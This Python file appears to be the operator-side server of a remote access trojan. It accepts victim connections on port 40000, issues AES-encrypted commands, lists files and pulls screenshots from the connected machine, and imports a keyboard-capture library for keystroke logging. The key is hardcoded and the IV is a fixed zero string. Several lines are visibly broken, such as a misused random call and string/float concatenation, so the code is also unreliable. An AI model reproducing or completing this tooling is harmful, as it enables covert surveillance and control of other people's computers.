import socket, pyautogui, base64, random, time, traceback
from threading import Thread
from pynput import keyboard 
from Crypto.Cipher import AES

HOST = ''
PORT = 40000
BUFSIZE = 1024
ADDR = (HOST, PORT)
isActive = True

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

client = {'ip':''}

# print(ADDR) # ip, port 가져옴.

# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# conn = s.connect(ADDR)

# def send_key(conn ,key):
#     conn.send(key)
#     print(f'send message %s ' %key)  
      


def Send(sock, cmd, end = "EOFEOFEOFEOFEOFX"):
    sock.sendall(EncodeAES(cipher, cmd + end))

def Receive(sock, end=("EOFEOFEOFEOFEOFX").encode()):
    data = str("").encode()
    l = sock.recv(1024)
    while(l):
        decrypted = DecodeAES(cipher, l)
        data = data + decrypted
        if data.endswith(end) == True:
            break
        else:
            l = sock.recv(1024)
    return data[:-len(end)]

def download(sock, filename):
    f = open('./temp/'+filename, "wb")
    filedata = Receive(sock)
    f.write(filedata)
    time.sleep(0.7)
    f.close()
    time.sleep(0.7)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(ADDR)
s.listen(128)

while True:
    try:
        s.settimeout(10)
        cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')
        try:
            sock, addr = s.accept()
        except socket.timeout:
            continue
    
        client = {'ip':addr[0], 'port':addr[1]}
        
        Send(sock, 'Activate')

        # data = Receive(s)
        
        # try:
        #     if data.startswith(("connected").encode()) == True:
        #         isActive = True
        #         print(isActive)
        # except Exception as e:
        #     continue
        
        while isActive:
            try:
                data = input('input cmd: ')
                Send(sock, data)
            except Exception:
                continue
            
            if data == "quit":
                s.close()
                exit(0)                
            elif data == "ls":
                data = Receive(sock)
                print(data)
            elif data == "screen shot":
                download(sock, data+str(random.random(0,0x100)+".png"))
                            
    except Exception as e:
        err_msg = traceback.format_exc()
        print(err_msg)
        print(e)
        